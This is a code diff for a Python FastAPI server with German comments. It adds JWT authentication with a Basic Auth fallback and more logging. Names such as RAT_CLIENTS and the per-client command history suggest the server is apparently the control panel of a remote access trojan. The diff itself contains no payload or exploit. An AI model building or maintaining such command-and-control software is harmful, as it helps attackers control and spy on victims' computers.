@@ -94,7 +94,7 @@ def get_server_stats():
         logging.error(f"Error getting server stats: {e}")
         return {"error": str(e)}
 
-# --- AUTH-FUNKTION FÜR NORMALE HTTP-ROUTEN ---
+# --- AUTH-FUNKTIONEN ---
 async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
     correct_username = secrets.compare_digest(credentials.username, ADMIN_USERNAME)
     correct_password = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
@@ -105,6 +105,60 @@ async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)
             headers={"WWW-Authenticate": "Basic"},
         )
     return credentials.username
+
+async def get_current_user_jwt(request: Request):
+    """JWT-basierte Authentifizierung für API-Endpunkte mit Basic Auth Fallback"""
+    auth_header = request.headers.get("Authorization")
+    
+    if not auth_header:
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Missing authorization header",
+            headers={"WWW-Authenticate": "Bearer"},
+        )
+    
+    # Try JWT Bearer token first
+    if auth_header.startswith("Bearer "):
+        token = auth_header.split(" ")[1]
+        user = verify_jwt_token(token)
+        if user:
+            return user
+        else:
+            raise HTTPException(
+                status_code=status.HTTP_401_UNAUTHORIZED,
+                detail="Invalid or expired JWT token",
+                headers={"WWW-Authenticate": "Bearer"},
+            )
+    
+    # Fallback to Basic Auth for debugging
+    elif auth_header.startswith("Basic "):
+        try:
+            credentials = base64.b64decode(auth_header.split(" ")[1]).decode('utf-8')
+            username, password = credentials.split(":", 1)
+            if (secrets.compare_digest(username, ADMIN_USERNAME) and 
+                secrets.compare_digest(password, ADMIN_PASSWORD)):
+                logging.info(f"API access via Basic Auth fallback for user: {username}")
+                return username
+            else:
+                raise HTTPException(
+                    status_code=status.HTTP_401_UNAUTHORIZED,
+                    detail="Invalid Basic Auth credentials",
+                    headers={"WWW-Authenticate": "Basic"},
+                )
+        except Exception as e:
+            logging.error(f"Basic Auth parsing error: {e}")
+            raise HTTPException(
+                status_code=status.HTTP_401_UNAUTHORIZED,
+                detail="Invalid Basic Auth format",
+                headers={"WWW-Authenticate": "Basic"},
+            )
+    
+    else:
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Unsupported authorization method",
+            headers={"WWW-Authenticate": "Bearer"},
+        )
 
 # --- JWT Funktionen ---
 def create_jwt_token(username: str):
@@ -118,7 +172,14 @@ def verify_jwt_token(token: str):
     try:
         payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
         return payload.get("sub")
-    except Exception:
+    except jwt.ExpiredSignatureError:
+        logging.warning("JWT token expired")
+        return None
+    except jwt.InvalidTokenError as e:
+        logging.warning(f"Invalid JWT token: {e}")
+        return None
+    except Exception as e:
+        logging.error(f"JWT verification error: {e}")
         return None
 
 # --- Web-UI Endpunkte ---
@@ -169,12 +230,12 @@ async def get_index(request: Request):
     return FileResponse("index.html")
 
 @app.get("/api/stats")
-async def get_stats(user: str = Depends(get_current_user)):
+async def get_stats(request: Request, user: str = Depends(get_current_user_jwt)):
     """API Endpunkt für Server-Statistiken"""
     return get_server_stats()
 
 @app.get("/api/clients")
-async def get_clients_api(user: str = Depends(get_current_user)):
+async def get_clients_api(request: Request, user: str = Depends(get_current_user_jwt)):
     """API Endpunkt für Client-Liste"""
     clients = []
     for cid, ws in RAT_CLIENTS.items():
@@ -190,19 +251,19 @@ async def get_clients_api(user: str = Depends(get_current_user)):
     return {"clients": clients}
 
 @app.get("/api/commands/{client_id}")
-async def get_command_history(client_id: int, user: str = Depends(get_current_user)):
+async def get_command_history(client_id: int, request: Request, user: str = Depends(get_current_user_jwt)):
     """API Endpunkt für Command History eines Clients"""
     return {"commands": COMMAND_LOGS.get(client_id, [])}
 
 @app.post("/api/ban/{ip}")
-async def ban_ip(ip: str, user: str = Depends(get_current_user)):
+async def ban_ip(ip: str, request: Request, user: str = Depends(get_current_user_jwt)):
     """API Endpunkt zum Bannen einer IP"""
     BANNED_IPS.add(ip)
     logging.info(f"IP {ip} manually banned by {user}")
     return {"message": f"IP {ip} wurde gesperrt"}
 
 @app.delete("/api/ban/{ip}")
-async def unban_ip(ip: str, user: str = Depends(get_current_user)):
+async def unban_ip(ip: str, request: Request, user: str = Depends(get_current_user_jwt)):
     """API Endpunkt zum Entbannen einer IP"""
     if ip in BANNED_IPS:
         BANNED_IPS.remove(ip)
@@ -212,10 +273,21 @@ async def unban_ip(ip: str, user: str = Depends(get_current_user)):
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
+    client_ip = websocket.client.host if websocket.client else "unknown"
     token = websocket.query_params.get("token")
-    if not token or not verify_jwt_token(token):
+    
+    if not token:
+        logging.warning(f"WebSocket connection from {client_ip} rejected: No token provided")
         await websocket.close(code=4401)
         return
+        
+    user = verify_jwt_token(token)
+    if not user:
+        logging.warning(f"WebSocket connection from {client_ip} rejected: Invalid token")
+        await websocket.close(code=4401)
+        return
+    
+    logging.info(f"WebSocket connection accepted for user {user} from {client_ip}")
     
     await websocket.accept()
     WEB_UI_SOCKETS.add(websocket)
